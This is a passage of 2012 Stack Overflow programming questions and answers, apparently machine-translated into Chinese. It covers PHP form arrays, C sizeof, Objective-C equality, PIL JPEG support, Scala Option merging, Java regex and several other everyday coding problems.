$books = array(
  10001 => 'good',
  10002 => 'new',
  10003 => 'new',
  10004 => 'good'
); 
```

我们需要做的是绑定与每本书相关的两个输入，这意味着我们需要一组可以匹配的键/值对。这对我来说听起来像是一个数组。但与上面的示例不同，键应该与数据无关——它们不需要任何意义，因为我们想要的只是数据。

我们需要做的是明确指定每个键（没有堆栈式数组推送）并使键与它们相关的数据无关。

我们做得到：

```
$i = 0;
foreach ($books as $isbn => $condition) {
  echo "
    <tr>
      <td>
        <input type='hidden' name='condition[$i]' value='$condition' />
        <input type='checkbox' name='delete[$i]' value='$isbn' />
      </td>
    </tr>
  ";
  $i++;
} 
```

...然后，当提交表单时，我们可以这样做：

```
// We still base our code on $_POST['delete'] - because this is the array that
// depends on the user input. This time, though, we'll look at the keys as well
foreach ($_POST['delete'] as $key => $isbn) {
  $condition = $_POST['condition'][$key];
  // Do stuff
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-05T22:54:25.763

I'm a little confused about what you are asking, but I think I can simplify this for you. I don't know how you are generating the values for the hidden fields, are they hard coded? Regardless, this system would work much better if it were simplified.

Try this out....

This will combine the info for the numbers and condition, then it will split them on the backend for handling. This way the information is passed at the same time.

```
<tr>
         <td>
            <input type='checkbox' name='delete[]' value='100001-good' />
         </td>
      </tr>

      <tr>
         <td>
            <input type='checkbox' name='delete[]' value='100002-new' />
         </td>
      </tr>

      <tr>
         <td>
            <input type='checkbox' name='delete[]' value='100003-new' />
         </td>
      </tr>

    <?php

       if(isset($_POST['deleteInventoryBook'])){
          if(isset($_POST['delete']) && is_array($_POST['delete'])){
             foreach($_POST['delete'] as $checkbox){
               $checkbox = explode('-', $checkbox);
               echo $checkbox[1];
               echo '<br />';
               echo $checkbox[0];
               echo '<br />';
             }
          }else{
             echo "No values have been set";
          }
       }

    ?> 
```

Again, I don't know if this is helpful or not because I was a little misunderstood about what exactly you were trying to achieve, but I hope it was helpful.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T22:38:57.863

您将不得不找到一种创造性的方法将多个隐藏字段作为数组传递给 PHP 处理程序，或者更改收集数据的方式。“序列化”数组似乎是最好的选择。

[这个 StackOverflow 答案](https://stackoverflow.com/a/4237117/1415625)确实概述了您可以做什么，并且仍然应该与您的脚本的行为相匹配。祝你好运！

# c - sizeof(var) 是否总是在 C 中工作？

> ID：11820621
> 
> 赞同：0
> 
> 时间：2012-08-05T22:32:18.567
> 
> 标签：c, variables, sizeof, binaryfiles

每当我想使用 C 读取或写入*二进制文件*时，我都会使用`fread()`and`fwrite()`函数。他们需要正在读取或写入的数据字节作为参数，因此我使用该`sizeof()`函数。现在的问题是：

书上说我应该声明一个这样的函数：

```
fread(&variable,sizeof(TYPE_OF_VAR),quantity,file); 
```

我使用了以下语句，它在大多数情况下都有效，但并非总是如此：

```
fread(&variable,sizeof(VARIABLE),quantity,file); 
```

为什么它有时有效但有时无效？
它是否取决于变量的*类型**（int、char 等）*？
这是否取决于我使用的数据*量？*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T22:37:14.447

要记住的是，这`sizeof`是基于编译器在编译时对类型的了解（暂时忽略 VLA）。如果给它一个变量，它将使用该变量的类型。

所以，我唯一能想到它不能像你期望的那样工作的地方是使用**指针**。

基本上它归结为：

```
int x[5];
int *y = &x[0];
int *p = malloc(sizeof(int) * 5);
sizeof(x); // == sizeof(int) * 5
sizeof(y); // == sizeof(int *)
sizeof(p); // == sizeof(int *) 
```

这在处理函数时会变得很棘手，因为数组在传递给函数时会**衰减为指针。**另请注意，所有这 3 个都是完全等价的：

```
int func(int *p);
int func(int p[5]);
int func(int p[]); 
```

在所有 3 中， p 是一个**指针**，而不是一个数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T22:42:11.610

有关堆与堆栈的讨论，请参阅此堆栈溢出问题：*[堆栈和堆是什么以及在哪里](https://stackoverflow.com/questions/79923/what-and-where-are-the-stack-and-heap)*。

`sizeof()`在堆元素上，如指针，将返回指针的大小，而不是指针可以存储的元素数。

但是，`sizeof()`在堆栈元素上：数组或`const char *`将返回数组或字符串的长度。

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define LENGTH 100

int main(int argc, char *argv[])
{
    char *a = NULL;
    char b[10] = "abcdefghi";

    printf("sizeof(b): %zu\n", sizeof(b));

    a = malloc(LENGTH + 1);
    if (a) {
        *(a + LENGTH) = '\0';
        memset(a, ' ', LENGTH);
        fprintf(stdout, "a (before memcpy):\t[%s]\n", a);
        printf("sizeof(a), before: %zu\n", sizeof(a));
        memcpy(a, b, sizeof(b) - 1);
        fprintf(stdout, "a (after memcpy):\t[%s]\n", a);
        printf("sizeof(a), after: %zu\n", sizeof(a));
        free(a);
    }

    return EXIT_SUCCESS;
} 
```

编译：

```
$ gcc -Wall sizeofTest.c -o sizeofTest 
```

输出：

```
$ ./sizeofTest
sizeof(b): 10
a (before memcpy):     [                                                                                                    ]
sizeof(a), before: 8
a (after memcpy):      [abcdefghi                                                                                           ]
sizeof(a), after: 8 
```

在我的平台上，a`char *`指向占用 8 个字节的内存地址。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T22:38:52.040

它会一直有效。

```
int main()
{
    char a[10];
    int b[10];
    printf("%d %d %d %d %d %d",sizeof(char),sizeof(int), sizeof(a),sizeof(b), sizeof(a[0]), sizeof(b[0]) );
} 
```

试试上面的代码。您应该看到（取决于编译器，我的 char 为 1 字节，整数为 4 字节）1,4,10,40,1,4

fread 或 fwrite 或您使用它的任何地方都没有什么不同。

# objective-c - 与明显和模糊的对象混淆

> ID：11820628
> 
> 赞同：0
> 
> 时间：2012-08-05T22:33:35.087
> 
> 标签：objective-c, nsnumber, nscountedset

我认为这`NSCountedSet`计数`numB`和`numC`频率的两倍，因为它们具有相同的值，所以我`Fraction`从我的类中创建了两个对象（未显示）`Fraction`，并且我将它们的`ivars`( `numerator`, `denominator`) 设置为彼此相等，但将`countForObject:`它们视为两个不同的对象并计数它们的频率各为一个。`numA`并`numB`指向内存中的不同位置但共享相同的值，并且两个`Fraction`对象指向内存中的不同位置但共享相同的值。为什么`Number`对象被视为模糊，而不是`Fraction`对象？

```
#import <Foundation/Foundation.h>
#import "Fraction.h"

int main (int argc, char *argv[]) {
    @autoreleasepool {
        NSNumber *numA = [NSNumber numberWithInt: 1];
        NSNumber *numB = [NSNumber numberWithInt: 2];
        NSNumber *numC = [NSNumber numberWithInt: 2];

        NSArray *array = [NSArray arrayWithObjects: numA, numB, numC, nil];

        NSCountedSet *mySet = [[NSCountedSet alloc] initWithArray: array];
        for (NSNumber *myNum in mySet) {
            NSLog(@"Number: %i Frequency: %lu", [myNum intValue], [mySet countForObject: myNum]);
        }

        }
    return 0;
} 
```

* * *

```
2012-08-05 17:44:58.667 prog[1150:707] Number: 1 Frequency: 1
2012-08-05 17:44:58.669 prog[1150:707] Number: 2 Frequency: 2 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T22:40:42.787

为了让您的自定义类被`NSCountedSet`Foundation 的其余部分识别和识别，您必须`-isEqual:`正确实施`-hash`。默认情况下，它们比较指针，因此即使它们表示相同的数据，两个对象也永远不会比较相等。`-isEqual:`一个类的幼稚实现`Fraction`可能如下所示：

```
- (BOOL)isEqual: (id)anObject {
    #error Naive implementation. Do not use.
    if (anObject == self) {
        return YES;
    } else if ([anObject isKindOfClass: [Fraction class]]) {
        Fraction *reducedSelf = [self reducedFraction];
        Fraction *reducedOther = [anObject reducedFraction];
        if (reducedSelf.numerator == reducedOther.numerator && reducedSelf.denominator == reducedOther.denominator) {
            return YES;
        }
    }

    return NO;
}

- (NSUInteger)hash {
    #error Naive implementation. Do not use.
    Fraction *reducedSelf = [self reducedFraction];
    return reducedSelf.numerator ^ reducedSelf.denominator;
} 
```

请注意，这不允许您将`Fraction`类的实例与`NSNumber`. 因为`-isEqual:` *必须*是可交换的并且因为相等的对象*必须*具有相同的哈希值，所以您需要提供一个兼容的实现`NSNumber`（可能通过子类化它并使用`NSNumber`的实现。）

# c# - C# - 多个产品配置

> ID：11820635
> 
> 赞同：0
> 
> 时间：2012-08-05T22:35:14.910
> 
> 标签：c#, app-config

我有一个使用两种不同配置的生产程序。使用参数调用它们（例如 exec Myprog.exe parm=Conf1 和 exec Myprog.exe parm=Conf2）

配置文件中是否有可能根据配置使用配置变量的部分。我已经看到了可以在构建中执行此操作的示例（例如，对于 dev 与 prod），但不能针对两个不同的 prod 版本。

我知道我可以从两个不同的目录调用它们并在每个目录中有不同的配置文件，但这很麻烦。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T22:39:09.940

您可以为 Conf1 和 Conf2 添加另一个构建，而不是尝试这样做，您不仅限于调试和发布配置

您可以在此处找到有关具体细节的好教程，并在[此处](http://vishaljoshi.blogspot.com.au/2009/03/web-deployment-webconfig-transformation_23.html)找到一些转换的[解释](http://msdn.microsoft.com/en-us/library/dd465326%28VS.100%29.aspx)

基本步骤是

1.  创建配置
2.  为配置添加转换
3.  编写转换以针对不同版本进行实际修改
4.  生成转换（将在部署时完成，具体取决于您的操作方式）
5.  利润

[编辑：官方 ASP.net 网站](http://www.asp.net/mvc/tutorials/deployment/deployment-to-a-hosting-provider/Deployment-to-a-Hosting-Provider-Web-Config-File-Transformations-3-of-12)上还有另一个很好的教程

# objective-c - tableview - 无法识别的选择器 didSelectRowAtIndexPath

> ID：11820646
> 
> 赞同：5
> 
> 时间：2012-08-05T22:37:23.387
> 
> 标签：objective-c, ios, xcode, uitableview

我的应用程序在 tableView 中选择某些内容时出现崩溃问题。这不是 100% 可重现的，但它相对经常发生。

在我的 EventListViewController 类（UITableViewController 的子类）中发生了什么，我覆盖了 didSelectRowAtIndexPath 函数，因为我也在这个类中使用了搜索栏，我希望它只在你不搜索时选择。

代码如下所示：

```
-(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    if(!searching)
        [super tableView:tableView didSelectRowAtIndexPath:indexPath];
} 
```

但是，当它崩溃时，我会因异常而中断，这是我在调用超级函数的行上收到的消息：

```
[EventListViewController tableView:didSelectRowAtIndexPath:]: unrecognized selector sent to instance 0xa648e50 
```

我在调试器上打印了一些东西，对我来说一切都很好：

```
(lldb) po 0xa648e50
(int) $1 = 174362192 <EventListViewController: 0xa648e50>

(lldb) po self
(EventListViewController *) $2 = 0x0a648e50 <EventListViewController: 0xa648e50>

(lldb) po tableView
(UITableView *) $3 = 0x070fd400 <UITableView: 0x70fd400; frame = (0 0; 320 367); clipsToBounds = YES; autoresize = W+H; layer = <CALayer: 0x6e46750>; contentOffset: {-0, -0}>

(lldb) po indexPath
(NSIndexPath *) $4 = 0x06e8caf0 <NSIndexPath 0x6e8caf0> 2 indexes [1, 1] 
```

（tableView 有 2 个部分，第二部分有 2 个条目）

有人知道发生了什么吗？如果您需要更多信息，请告诉我。

注意：经过更多调查，我发现这是 100 % 可通过以下步骤重现的： 1：加载应用程序，然后单击两个条目中的任何一个。2：返回 tableView 控制器 3：点击两个条目下方，在不应该有单元格的空白处应用程序将崩溃，但请注意 indexPath 并没有说它试图选择一个单元格超出了tableView的范围，只是tableView的didSelectRowAtIndexPath方法不存在

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-08-05T22:42:35.423

调用`super`in`tableView:didSelectRowAtIndexPath:`是不必要的。如果我没记错的话，`UITableViewController`不提供该方法的默认实现。因此，您对 super 的调用会导致崩溃。

# jquery - 如果是最后一个孩子执行代码

> ID：11820648
> 
> 赞同：1
> 
> 时间：2012-08-05T22:37:36.737
> 
> 标签：jquery, if-statement

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T22:39:18.690

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-05T22:39:27.457

首先，你有两个具有相同`options`id 的 div——这根本行不通。

但一般来说，要获取页面上的最后一个 a ，您可以执行以下操作：

```
var lastA = $("a:last")[0]; 
```

然后在您的点击处理程序中进行比较：

```
if (lastA === this) 
{
     alert("hello");
} 
```

# python - PIL 在 Mac OS 下无法识别 jpeg 库

> ID：11820649
> 
> 赞同：5
> 
> 时间：2012-08-05T22:37:48.223
> 
> 标签：python, macos, python-imaging-library

像这样的脚本：

```
from PIL import Image, ImageOps
img = Image.open('1.JPG')
thumb = ImageOps.fit(img, (200,200) , Image.ANTIALIAS, (0.5, 0.5)) 
```

导致此 IOError：

```
Traceback (most recent call last):
  (...)
  File "/Library/Python/2.7/site-packages/PIL/Image.py", line 385, in _getdecoder
    raise IOError("decoder %s not available" % decoder_name)
IOError: decoder jpeg not available 
```

如何为我的 PIL 获得 jpeg 支持？这个问题似乎是众所周知的，但现有的线程并没有为我解决这个问题。我将 brew 和 pip 用于我的 python 包，并且已经尝试了以下方法：

*   `brew install jpeg` 原因`Error: jpeg-8d already installed`
*   `brew install libjpeg`原因`Error: jpeg-8d already installed`
*   `sudo pip install Pillow`- 安装工作但没有改变任何东西

如何为我的 PIL 安装获得 jpeg 支持？有任何想法吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-05T22:44:21.483

我不明白为什么，但重新安装 PIL 解决了这个问题：

```
sudo pip uninstall pil
sudo pip install pil 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T21:20:10.377

对于登陆这里的非 OSX 人员，我发现[链接](http://jj.isgeek.net/2011/09/install-pil-with-jpeg-support-on-ubuntu-oneiric-64bits/ "这个")到我的 64 位 Ubuntu 系统上的 64 位库以修复编译问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-29T23:39:00.337

我在 Ubuntu 12.04 64 位上遇到了类似的问题，并通过符号链接 PIL 正在寻找的库`/usr/lib`（它实际上正在寻找它们）来解决它：

```
# symlink image libraries so PIL can find them
ln -s /usr/lib/x86_64-linux-gnu/libjpeg.so /usr/lib
ln -s /usr/lib/x86_64-linux-gnu/libfreetype.so /usr/lib
ln -s /usr/lib/x86_64-linux-gnu/libz.so /usr/lib
# etc for any other libraries 
```

# c# - 如何从资源文件中获取图像路径

> ID：11820650
> 
> 赞同：0
> 
> 时间：2012-08-05T22:37:53.510
> 
> 标签：c#

我将图像存储在资源文件中，但我使用的 PDF Lib 需要图像路径作为字符串，以便在输出中嵌入图像。

但老实说，我找不到任何方法来做到这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T22:42:57.353

将图像提取到磁盘上的临时位置，然后将该临时位置提供给 PDF 库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T22:44:53.023

您可以使用`Assembly.GetManifestResourceStream(resource_name_of_the_image)`访问图像的流，将其写入 TEMP 目录并使用此路径。

例如，如果您的项目中有一个位于路径“ **Resources\Images\Image.png** ”的图像文件，并且项目的程序集默认命名空间是“ **RootNamespace** ”，则可以从该程序集的代码中访问图像的流

```
Assembly.GetExecutingAssembly().GetManifestResourceStream("RootNamespace.Resources.Images.Image.png") 
```

# c++ - 链式“运算符>>”优于可变参数模板函数？

> ID：11820651
> 
> 赞同：2
> 
> 时间：2012-08-05T22:38:03.930
> 
> 标签：c++, c++11

考虑以下 C++ 代码：

```
A a = ...;
B b = ...;
C c = ...;

cin >> a >> b >> c;
...
cout << a << b << c; 
```

现在我们有了 C++11 可变参数模板函数（我认为），它可以通过以下方式之一实现：

```
cin.read(a,b,c);
cout.write(a,b,c);

read(cin,a,b,c);
write(cout,a,b,c);

cin(a,b,c);
cout(a,b,c); 
```

`<<`与这些方式相比，链式操作符有什么优势吗？换句话说 - 你认为如果他们一开始就有可变参数模板函数，他们仍然会使用`operator <<`and`operator >>`吗？如果是这样，为什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-05T22:42:10.727

iostreams 最重要的方面之一是它是*可扩展*的。您可以添加新类型，您需要做的就是`<<`为写入和`>>`读取提供重载。

您需要为可变参数版本提供类似的机制。

您必须提供一些全局或命名空间范围的函数名称，这些函数名称将由`istream::read`and的参数相关查找调用`ostream::write`。此函数的名称需要明确定义。但是您根本找不到该函数的名称`cin.read(a,b,c);`。除非它是`read`，在这种情况下，您会遇到许多潜在的名称冲突问题。

这种机制不如重载那么明显`operator<<`。您需要查看文档以了解要为其编写重载的函数的名称是什么，while`operator<<`就在语句中：`cout << ...`.

# scala - 结合 Scala 选项[Iterable[_]]

> ID：11820657
> 
> 赞同：5
> 
> 时间：2012-08-05T22:39:02.173
> 
> 标签：scala, collections, monads

我正在尝试将两个组合`Option[Iterable[_]]`成一个新的`Option[Iterable[_]]`. 如果其中一个（或两个）元素是 Some ，我想返回 Some ，否则返回 None 。似乎应该有一种惯用的方式来做到这一点，但我似乎找不到。以下似乎可以满足我的要求，但并不是我希望的完美解决方案。

```
def merge(
    i1: Option[Iterable[_]], i2: Option[Iterable[_]]
): Option[Iterable[_]] = (i1, i2) match {
   case (Some(as), Some(bs)) => Some(as ++ bs)
   case (a @ Some(as), None) => a
   case (None, b @ Some(bs)) => b
   case _ => None
} 
```

任何提示表示赞赏。谢谢！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-05T23:37:17.170

如果你愿意忍受一些抽象代数，这里有一个很好的概括：`Iterable[_]`是一个连接下的[*幺*](http://en.wikipedia.org/wiki/Monoid)半群，其中一个幺半群只是一组事物（在这种情况下是可迭代的集合）和一个类似加法的操作 (连接）具有一些简单的属性和一个标识元素（空集合）。

类似地，如果`A`是一个幺半群，那么`Option[A]`在你的稍微更一般的版本下也是一个幺半群`merge`：

```
Some(xs) + Some(ys) == Some(xs + ys)
Some(xs) + None     == Some(xs)
None     + Some(ys) == Some(ys)
None     + None     == None 
```

（请注意，我们需要一个幺半群的事实`A`来知道在第一行要做什么。）

Scalaz[库](http://code.google.com/p/scalaz/)在其类型类中捕获了所有这些泛化`Monoid`，它允许您`merge`这样编写：

```
import scalaz._, Scalaz._

def merge(i1: Option[Iterable[_]], i2: Option[Iterable[_]]) = i1 |+| i2 
```

哪个按预期工作：

```
scala> merge(Some(1 to 5), None)
res0: Option[Iterable[_]] = Some(Range(1, 2, 3, 4, 5))

scala> merge(Some(1 to 5), Some(4 :: 3 :: 2 :: 1 :: Nil))
res1: Option[Iterable[_]] = Some(Vector(1, 2, 3, 4, 5, 4, 3, 2, 1))

scala> merge(None, None)
res2: Option[Iterable[_]] = None 
```

（请注意，还有其他操作可以为and提供有效`Monoid`实例，但您的操作是最常用的，也是 Scalaz 默认提供的操作。）`Iterable``Option`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-05T22:48:04.607

这有效：

```
def merge(i1: Option[Iterable[_]], i2: Option[Iterable[_]]): Option[Iterable[_]] =
  (for (a <- i1; b <- i2) yield a ++ b).orElse(i1).orElse(i2) 
```

`for`/`yield`部分将添加选项的内容当且仅当两者都是`Some`。

如果需要，您还可以删除一些点和括号：

```
 (for (a <- i1; b <- i2) yield a ++ b) orElse i1 orElse i2 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-06T02:04:04.990

您可以将其用于任意数量：

```
def merge(xs: Option[Iterable[_]]*) = 
  if (xs.forall(_.isEmpty)) None else Some(xs.flatten.flatten) 
```

# android - 如何使用转到网站的按钮创建 Android 应用程序？

> ID：11820670
> 
> 赞同：-1
> 
> 时间：2012-08-05T22:40:43.463
> 
> 标签：android, url, button, browser, android-intent

> **可能重复：**
> [在 Android 应用程序中单击按钮时如何打开网站？](https://stackoverflow.com/questions/5026349/how-to-open-a-website-when-a-button-is-clicked-in-android-application)

所以我是新手，我已经搜索过了，但似乎所有的答案都是旧的，所以请不要只是将我链接到另一个线程。因为我正在学习，所以也要尽可能地描述！

问题：如何使用 android sdk 在 eclipse 上创建一个 android 应用程序，该应用程序有一个按钮可以打开浏览器并转到特定站点。谢谢

-技术

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T01:56:41.067

您的应用程序需要两个主要部分，一个布局 xml 文件和一个 Java Activity。xml 将包含一个父布局和一个按钮。Java 文件会将内容视图设置为 xml 文件中包含的布局，提取对 Button 对象的引用并在其上设置点击侦听器，以便在用户按下它时获得回调。在回调中，您将使用 Intent 启动浏览器并打开给定的 url。

## 主要的.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="vertical"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    >

    <Button
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:id="@+id/webBtn" />

</LinearLayout> 
```

## MainActivity.java

```
public class MainActivity extends Activity{
    Button webBtn;
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        setContentView(R.layout.main);
        webBtn = (Button) findViewById(R.id.webBtn);
        webBtn.setOnClickListener(new OnClickListener() {
        public void onClick(View v){
            /**************************
             * This Intent will tell the System
             * that we want to view something
             * in this case we are telling it that
             * we want to view the URL that we 
             * pass as the second parameter. 
             * it will search thru the applications
             * on the device and find the one(s)
             * that can display this type of content.
             * If there are multiples it will prompt
             * the user to choose which one they'd like
             * to use.
             ***************************/
            Intent i = new Intent(Intent.ACTION_VIEW, "https://www.google.com");
            startActivity(i);
        }
        });
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-06T02:04:55.717

你需要做更多的研究。我知道你正在学习（我们都是从某个地方开始的，对吗？），但这并不意味着它可以让你不做作业。@Tim 的回答应该可以，但这里有更多资源可以帮助您，不仅可以解决这个问题，还可以解决您可能遇到的更多问题：-Android 书籍：请参阅此[问题](https://stackoverflow.com/questions/11443374/what-is-a-good-book-to-learn-mobile-application-developmentandroid-that-is-exe/11443637#11443637)以及此[问题](https://stackoverflow.com/questions/1114287/good-book-for-beginning-android-development)。-Android 开发网站： http: [//developer.android.com/index.html](http://developer.android.com/index.html) -这个网站 -当然 youtube 我知道这并不能直接回答你的问题，但希望它会帮助你自己找到答案（另外它是很长，适合发表评论）！

# ruby-on-rails - 验证不允许同时使用这两个字段的问题

> ID：11820673
> 
> 赞同：0
> 
> 时间：2012-08-05T22:41:29.763
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, ruby-on-rails-3.1

我有一个`Price`具有 4 个不同字段的模型：

```
t.decimal  "amount"
t.decimal  "amount_per_unit"
t.decimal  "unit_quantity"
t.string   "unit" 
```

我正在尝试进行自定义验证，以允许填充`amount`or`amount_per_unit` 字段（包括`unit quantity`and `unit`）但不能同时填充它们。所以做一个字图来表达我的意思。

```
amount = YES
amount_per_unit + unit + unit_quantity = YES

amount_per_unit (alone or amount.present) = NO
unit_quantity (alone or amount.present) = NO
unit (alone or amount.present) = NO
amount and amount_per_unit + unit + unit_quantity = NO 
```

如果您仍然感到困惑，请知道它要么是填写的金额本身，要么是（1 或 3）的单位金额字段。

到目前为止，我在我的`Price`模型中尝试了这个验证：

```
validates :amount, :numericality => true                                
validates :amount_per_unit, :numericality => true       
validates :unit_quantity, :numericality => true
validates :unit, :inclusion => UNITS

validate :must_be_base_cost_or_cost_per_unit

private

  def must_be_base_cost_or_cost_per_unit
    if self.amount.blank? and self.amount_per_unit.blank? and self.unit.blank? and self.unit_quantity
        #   one at least must be filled in, add a custom error message
        errors.add(:amount, "The product must have a base price or a cost per unit.")
        return false
    elsif !self.amount.blank? and !self.amount_per_unit.blank? and !self.unit.blank? and !self.unit_quantity
        #   both can't be filled in, add custom error message
        errors.add(:amount, "Cannot have both a base price and a cost per unit.")
        return false
    else
        return true
    end
  end 
```

此验证不起作用，因为所有字段都是空白的，它会导致`numericality`错误，如果我填写所有字段，它会创建填充所有字段的价格。需要修复什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:41:20.990

我认为你的价值观是零，而不是空白。

尝试将第二个条件更改为：

```
elsif !self.amount.to_s.blank? and !self.amount_per_unit.to_s.blank? and !self.unit.to_s.blank? and !self.unit_quantity.to_s.blank? 
```

此外，您似乎在两个语句的最后一个条件上都有错字（例如！self.unit_quantity 而不是 !self.unit_quantity.to_s.blank？

我希望这会有所帮助。

# c# - 如何将 BufferList 与 SocketAsyncEventArgs 一起使用而不会得到 SocketError InvalidArgument？

> ID：11820677
> 
> 赞同：7
> 
> 时间：2012-08-05T22:41:53.863
> 
> 标签：c#, .net, system.net, socketasynceventargs

我可以使用 SetBuffer 和 SocketAsyncEventArgs 就好了。

如果我尝试使用 BufferList（在执行 SetBuffer(null, 0, 0) 之后），当我在套接字上执行 SendAsync 时，我总是立即得到 SocketError InvalidArgument (10022)。

没有关于如何使用 BufferList 以及我正在做的事情的示例或文档（无论如何对我来说）。

有人可以指出一个示例程序或代码片段吗？

我正在为此撕扯头发，剩下的不多了...

这基本上是我正在做的事情（e 是 SocketAsyncEventArgs 和 lSocket 是我用于 SetBuffer 的同一个套接字）

```
// null the buffer since we will use a buffer list
e.SetBuffer(null, 0, 0);

// create a bufferlist
e.BufferList = new List<ArraySegment<byte>>();

// create the bufferlist with the network header and the response bytes
e.BufferList.Add(new ArraySegment<byte>(lTxBytes)); // add the 4 character total length
e.BufferList.Add(new ArraySegment<byte>(Encoding.ASCII.GetBytes(lTx.Identity))); // echo back the incoming sequence number
e.BufferList.Add(new ArraySegment<byte>(Encoding.ASCII.GetBytes(lResponse)));

// *** the SendAsync always completes IMMEDIATELY (returns false) gets SocketError InvalidArgument (10022)

if (lSocket.SendAsync(e) == false)
{
      // data was already sent back to the client.
      AppSupport.WriteLog(LogLevel.Flow, "ProcessReceive had SendAsync complete synchronously (bytes transferred {0}).", e.BytesTransferred);
      ProcessSend(e);
} 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-07-02T09:44:04.920

您遇到异常的原因是，在设置属性`SocketAsyncEventArgs`时，仅使用列表中存在的缓冲区。`BufferList`基本上，您正在尝试使用代码发送空缓冲区：

```
e.BufferList = new List<ArraySegment<byte>>();   
e.BufferList.Add(new ArraySegment<byte>(lTxBytes));
e.BufferList.Add(new ArraySegment<byte>(Encoding.ASCII.GetBytes(lTx.Identity)));
e.BufferList.Add(new ArraySegment<byte>(Encoding.ASCII.GetBytes(lResponse))); 
```

而是尝试这样做：

```
var list = new List<ArraySegment<byte>>();
list.Add(new ArraySegment<byte>(lTxBytes));
list.Add(new ArraySegment<byte>(Encoding.ASCII.GetBytes(lTx.Identity)));
list.Add(new ArraySegment<byte>(Encoding.ASCII.GetBytes(lResponse)));
e.BufferList = list; 
```

这种行为根本没有很好的文档记录，只能通过`BufferList`详细查看 setter 代码来理解。在幕后`SocketAsyncEventArgs`有一个`WSABuffer`数组字段（用于与本机代码互操作），当您设置`BufferList`. 由于它是`WSABuffer[]`发送到本机代码的，这就解释了为什么您的代码会引发异常。

# java - 正则表达式 - 解析字符串

> ID：11820680
> 
> 赞同：1
> 
> 时间：2012-08-05T22:42:06.277
> 
> 标签：java, regex

假设我有一个包含以下行的文件：

```
Hayden
y 
```

假设我想操纵只包含“y”而不是海登的那一行，我该怎么做？

所以我读入文件并逐行解析。我想说如果该行包含“y”之前或之后的字母，那么它不是我正在寻找的行。

我以为我可以做到以下几点：

```
String value = "y"; 
if(strLine.matches("[a-zA-Z]" + value + "[a-zA-Z]"))
{
      don't manipulate line here
}
else
{
   manipulate string here
} 
```

但是，这会得到“Hayden”和“y”

有任何想法吗？

**编辑**

对不起，我应该更清楚，如果我不介意前面是否有空格或符号怎么办？还是后面？尤其是我需要注意的字母。例如，我不能有 yh 但我可以有 y=... 再次抱歉

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-05T22:44:51.337

您可以使用负面[环视](http://www.regular-expressions.info/lookaround.html)：

```
if (strLine.matches("^.*(?<![a-zA-Z])y(?![a-zA-Z]).*$")) { 
    // manipulate string here
} 
```

锚点是可选的，但为了清楚起见无论如何都包括在内。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-05T22:44:59.307

您可以使用：

```
strLine.matches("^y$") 
```

要忽略符号，即非字母数字字符，请使用：

```
strLine.matches("^\\W*y\\W*$") 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T22:51:44.987

也许这就是你要找的

```
String[] lines={"Hayden","y"," y*","y=","y+"," +y..."};
for (String s:lines)
    System.out.println(s+"->"+s.matches("\\W*y\\W*")); 
```

输出：

```
Hayden->false
y->true
 y*->true
y=->true
y+->true
 +y...->true 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-05T22:52:26.670

Extending the equals approach: Just remove all the character you don't mind, and then check for equality with `"y"`:

```
if (strLine.replaceAll("[^a-zA-Z]", "").equals("y")) {
    ...
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-05T22:45:02.523

如果要使用正则表达式，则需要更具体一点：

*   `y`匹配`y`行中的任意位置。
*   `^y$`匹配`y`字符串末尾（美元符号）之前和字符串开头（插入符号）之后的 a。这使您可以匹配*等于*的行`y`。

# java - Java中重复排列（字符串的形式为：00001112222）

> ID：11820683
> 
> 赞同：6
> 
> 时间：2012-07-04T19:54:46.537
> 
> 标签：java

我有形式的字符串`000011122222`。也就是说，连续的数字重复随机数。次。其他一些例子可能是：

```
0011122223333
01222    
00011234444
001122222 
```

等等。我知道，对于 string`01222`来说，总共`5!/3!`可能有排列。我需要为每个这样的字符串生成所有这些排列。

我尝试过通过各种方法生成排列。一种是生成所有可能的排列（就像没有重复的字符串一样），但是由于我将使用的字符串可能非常大，这可能会浪费时间来生成过多的冗余排列。

其次，我尝试将数字放置在等于字符串大小的字符数组的随机索引处，并在数字计数与输入字符串中的相同时终止循环。但是，这样我浪费了很多内存，也占用了很多时间。

我需要一种有效的方法来为这些字符串生成排列。只是一个算法或代码，任何一个都是受欢迎的。我正在使用 Java。

谢谢！
